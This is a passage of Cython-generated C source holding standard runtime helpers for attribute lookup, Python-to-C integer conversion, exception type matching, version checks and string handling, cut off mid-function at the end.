static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *o, PyObject *n) {
#if CYTHON_USE_TYPE_SLOTS
#if PY_MAJOR_VERSION >= 3
    if (likely(PyUnicode_Check(n)))
#else
    if (likely(PyString_Check(n)))
#endif
        return __Pyx_PyObject_GetAttrStr(o, n);
#endif
    return PyObject_GetAttr(o, n);
}

/* Globals */
static PyObject* __Pyx_Globals(void) {
    Py_ssize_t i;
    PyObject *names;
    PyObject *globals = __pyx_d;
    Py_INCREF(globals);
    names = PyObject_Dir(__pyx_m);
    if (!names)
        goto bad;
    for (i = PyList_GET_SIZE(names)-1; i >= 0; i--) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject* name = PySequence_ITEM(names, i);
        if (!name)
            goto bad;
#else
        PyObject* name = PyList_GET_ITEM(names, i);
#endif
        if (!PyDict_Contains(globals, name)) {
            PyObject* value = __Pyx_GetAttr(__pyx_m, name);
            if (!value) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                goto bad;
            }
            if (PyDict_SetItem(globals, name, value) < 0) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                Py_DECREF(value);
                goto bad;
            }
        }
#if CYTHON_COMPILING_IN_PYPY
        Py_DECREF(name);
#endif
    }
    Py_DECREF(names);
    return globals;
bad:
    Py_XDECREF(names);
    Py_XDECREF(globals);
    return NULL;
}

/* CIntToPy */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
#define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
#if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* CheckBinaryVersion */
static int __Pyx_check_binary_version(void) {
    char ctversion[4], rtversion[4];
    PyOS_snprintf(ctversion, 4, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    PyOS_snprintf(rtversion, 4, "%s", Py_GetVersion());
    if (ctversion[0] != rtversion[0] || ctversion[2] != rtversion[2]) {
        char message[200];
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
